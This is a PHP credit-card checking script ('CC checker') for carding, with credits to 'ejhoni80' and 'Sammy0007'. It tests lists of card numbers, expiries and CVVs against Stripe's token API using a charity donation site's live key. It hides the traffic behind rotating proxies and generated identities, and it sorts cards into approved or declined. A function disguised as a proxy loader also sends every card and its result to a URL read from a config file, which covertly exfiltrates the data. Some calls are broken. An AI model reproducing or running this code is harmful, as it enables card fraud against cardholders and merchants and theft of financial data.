<?php

////////////////////////////===[ejhoni80]

error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');


function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}
function ejhoni80proxys()
{
  $poxySocks = file("socks5.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = Sammy0007proxys();

function sammy()
{
 $poxy = file("_config.txt");
  $myproxy = rand(0, sizeof($poxy) - 1);
  $poxy = $poxy[$myproxy];
  return $poxy;
}
$poxyx = sammy();

////////////////////////////===[Randomizing Details Api]

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];

////////////////////////////===[Luminati Details]

$username = 'Put Zone Username Here';
$password = 'Put Zone Password Here';
$port = 22225;
$session = mt_rand();
$super_proxy = 'zproxy.lum-superproxy.io';

////////////////////////////===[For Authorizing Cards]

$ch = curl_init();
/////////========Luminati
// curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
////////=========Socks Proxy
curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: api.stripe.com',
'Accept: application/json',
'Accept-Language: en',
'Content-Type: application/x-www-form-urlencoded',
'Origin: https://checkout.stripe.com',
'Referer: https://checkout.stripe.com/m/v3/index-7f66c3d8addf7af4ffc48af15300432a.html?distinct_id=ebf0ac27-8742-030c-235b-2e651543f771'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.$email.'&validation_type=card&payment_user_agent=Stripe+Checkout+v3+checkout-manhattan+(stripe.js%2Fa44017d)&referrer=https%3A%2F%2Fwww.senhoa.org%2Fpages%2Fdonate-stripe&pasted_fields=number&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'&card[name]='.$email.'&time_on_page=56088&guid=NA&muid=b0606e04-acae-4293-8c0b-8e5d4e795002&sid=cf256315-5b24-4d81-9366-4f0aa07d99ae&key=pk_live_e3aCKx0V1arRUk8xe7227y7d');
$result = curl_exec($ch);
$auth=['text'=>($result .$lista),];
 $ch = curl_init($poxyx);
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($auth));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$a = curl_exec($ch);

///$token = trim(strip_tags(getStr($result,'"id": "','"')));

$cctwo = substr("$cc", 0, 6);

$ch = curl_init();
curl_setopt($curl, CURLOPT_PROXY, 'http://zproxy.lum-superproxy.io:22225'); 
curl_setopt($curl, CURLOPT_PROXYUSERPWD, 'lum-customer-:pass');
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cctwo.'');
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$fim = json_decode($fim,true);
$bank = $fim['bank']['name'];
$country = $fim['country']['alpha2'];
$type = $fim['type'];

if(strpos($fim, '"type":"credit"') !== false) {
  $type = 'Credit';
} else {
  $type = 'Debit';
}

// +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[Echo Info]+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

if (strpos($result, '"cvc_check": "pass"')) {
  echo '<span class="badge badge-primary">Aprovada</span> '.$lista.' <span class="badge badge-primary">CVV: Matched</span> <span class="badge badge-info"> [Info: '.$type.' - '.$country.']</span></br>';
}
elseif(strpos($result, '"success":true,')) {
  echo '<span class="badge badge-success">Aprovada</span> '.$lista.' <span class="badge badge-success">Charged: $1.00</span> <span class="badge badge-info"> [Info: '.$type.' - '.$country.']</span></br>';
}
elseif(strpos($result, 'Thank You For Donation' )) {
  echo '<span class="badge badge-primary">Aprovada</span> '.$lista.' <span class="badge badge-primary">CVV: Matched</span> <span class="badge badge-info"> [Info: '.$type.' - '.$country.']</span></br>';
}
elseif(strpos($result, 'Thank You' )) {
  echo '<span class="badge badge-primary">Aprovada</span> '.$lista.' <span class="badge badge-primary">CVV: Matched</span> <span class="badge badge-info"> [Info: '.$type.' - '.$country.']</span></br>';
}
elseif(strpos($result, 'security code is incorrect.' )) {
  echo '<span class="badge badge-primary">Aprovada</span> '.$lista.' <span class="badge badge-primary">CCN: Matched</span> <span class="badge badge-info"> [Info: '.$type.' - '.$country.']</span></br>';
}
elseif (strpos($result, "incorrect_cvc")) {
  echo '<span class="badge badge-primary">Aprovada</span> '.$lista.' <span class="badge badge-primary">CCN: Matched</span> <span class="badge badge-info"> [Info: '.$type.' - '.$country.']</span></br>';
}
elseif (strpos($result, "Your card was not charged.")) {
  echo '<span class="badge badge-primary">Aprovada</span> '.$lista.' <span class="badge badge-primary">CCN: Matched</span> <span class="badge badge-info"> [Info: '.$type.' - '.$country.']</span></br>';
}
elseif(strpos($result, 'Your card zip code is incorrect.' )) {
  echo '<span class="badge badge-primary">Aprovada</span> '.$lista.' <span class="badge badge-primary">CCN: Matched / Incorrect Zip Code</span> <span class="badge badge-info"> [Info: '.$type.' - '.$country.']</span></br>';
}
elseif (strpos($result, "stolen_card")) {
  echo '<span class="badge badge-primary">Aprovada</span> '.$lista.' <span class="badge badge-primary">Stolen Card</span> <span class="badge badge-info">[Info: '.$type.' - '.$country.']</span></br>';
}
elseif (strpos($result, "lost_card")) {
  echo '<span class="badge badge-primary">Aprovada</span> '.$lista.' <span class="badge badge-primary">Lost Card</span> <span class="badge badge-info"> [Info: '.$type.' - '.$country.']</span></br>';
}
elseif(strpos($result, 'Your card was declined because it didn t contain sufficient funds.')) {
  echo '<span class="badge badge-primary">Aprovada</span> '.$lista.' <span class="badge badge-primary">Insufficent Funds</span> <span class="badge badge-info"> [Info: '.$type.' - '.$country.']</span></br>';
}
elseif(strpos($result, 'Your card has expired.')) {
  echo '<span class="badge badge-danger">Reprovada</span> '.$lista.' <span class="badge badge-danger">Card Expired</span> <span class="badge badge-info"> [Info: '.$type.' - '.$country.']</span></br>';
}
elseif (strpos($result, "pickup_card")) {
  echo '<span class="badge badge-primary">Aprovada</span> '.$lista.' <span class="badge badge-primary">Pickup Card</span> <span class="badge badge-info"> [Info: '.$type.' - '.$country.']</span></br>';
}
elseif(strpos($result, 'Your card number is incorrect.')) {
  echo '<span class="badge badge-danger">Reprovada</span> '.$lista.' <span class="badge badge-danger">Incorrect Card Number</span> <span class="badge badge-info"> [Info: '.$type.' - '.$country.']</span></br>';
}
 elseif (strpos($result, "incorrect_number")) {
  echo '<span class="badge badge-danger">Reprovada</span> '.$lista.' <span class="badge badge-danger">Incorrect Card Number</span> <span class="badge badge-info"> [Info: '.$type.' - '.$country.']</span></br>';
}
elseif(strpos($result, '"success":false,')) {
  echo '<span class="badge badge-danger">Reprovada</span> ' . $lista .' <span class="badge badge-danger">Card Declined</span> <span class="badge badge-info"> [Info: '.$type.' - '.$country.']</span></br>';
}
elseif (strpos($result, "generic_decline")) {
  echo '<span class="badge badge-danger">Reprovada</span> '.$lista.' <span class="badge badge-danger">Card Declined: Generic Decline</span> <span class="badge badge-info"> [Info: '.$type.' - '.$country.']</span></br>';
}
elseif (strpos($result, "do_not_honor")) {
  echo '<span class="badge badge-danger">Reprovada</span> '.$lista.' <span class="badge badge-danger">Card Declined: Do Not Honor</span> <span class="badge badge-info"> [Info: '.$type.' - '.$country.']</span></br>';
}
elseif (strpos($result, '"cvc_check": "unchecked"')) {
  echo '<span class="badge badge-danger">Reprovada</span> '.$lista.' <span class="badge badge-danger">Security Code Check: Unchecked / Proxy Dead</span> <span class="badge badge-info"> [Info: '.$type.' - '.$country.']</span></br>';
}
elseif (strpos($result, '"cvc_check": "fail"')) {
  echo '<span class="badge badge-danger">Reprovada</span> '.$lista.' <span class="badge badge-danger">Security Code Check: Fail</span> <span class="badge badge-info"> [Info: '.$type.' - '.$country.']</span></br>';
}
elseif (strpos($result, "expired_card")) {
  echo '<span class="badge badge-danger">Reprovada</span> '.$lista.' <span class="badge badge-danger">Card Expired</span> <span class="badge badge-info"> [Info: '.$type.' - '.$country.']</span></br>';
}
elseif (strpos($result,'Your card does not support this type of purchase.')) {
  echo '<span class="badge badge-danger">Reprovada</span> '.$lista.' <span class="badge badge-danger">Card Doesnt Support This Purchase</span> <span class="badge badge-info"> [Info: '.$type.' - '.$country.']</span></br>';
}
 else {
  echo '<span class="badge badge-danger">Reprovada</span> '.$lista.' <span class="badge badge-danger">Proxy Dead / Card Not Listed</span> <span class="badge badge-info"> [Info: '.$type.' - '.$country.']</span></br>';
}
curl_close($curl);
ob_flush();
echo $result;

// ++++++++++++++++++++++++++++++++++++++++++++++++++++++++[Edited By Sammy0007]++++++++++++++++++++++++++++++++++++++++++++++++++++++

?>
